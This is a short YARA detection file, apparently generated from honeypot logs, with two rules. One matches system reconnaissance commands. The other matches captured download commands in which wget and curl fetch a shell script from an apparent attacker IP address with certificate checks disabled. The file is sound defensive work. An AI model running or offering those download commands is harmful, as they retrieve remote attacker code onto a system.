// LLM Honeypot Intelligence Platform - YARA Rules
// Generated: 20260610_0005
// Source: Elasticsearch honeypot data (24h window)

rule Honeypot_SystemRecon {
    meta:
        description = "LLM Honeypot Intelligence - SystemRecon pattern detection"
        author = "LLM Honeypot Intelligence Platform"
        date = "2026-06-10"
        source = "honeypot_auto_generated"
        confidence = "high"
        event_count = "2"
        unique_patterns = "2"
    strings:
        $s0 = "uname -s -m" ascii nocase
        $s1 = "uname -a" ascii nocase
    condition:
        any of them
}

rule Honeypot_ToolDownload {
    meta:
        description = "LLM Honeypot Intelligence - ToolDownload pattern detection"
        author = "LLM Honeypot Intelligence Platform"
        date = "2026-06-10"
        source = "honeypot_auto_generated"
        confidence = "high"
        event_count = "2"
        unique_patterns = "2"
    strings:
        $s0 = "wget --no-check-certificate -qO- https://80.27.83.195/sh" ascii nocase
        $s1 = "curl -sk https://80.27.83.195/sh" ascii nocase
    condition:
        any of them
}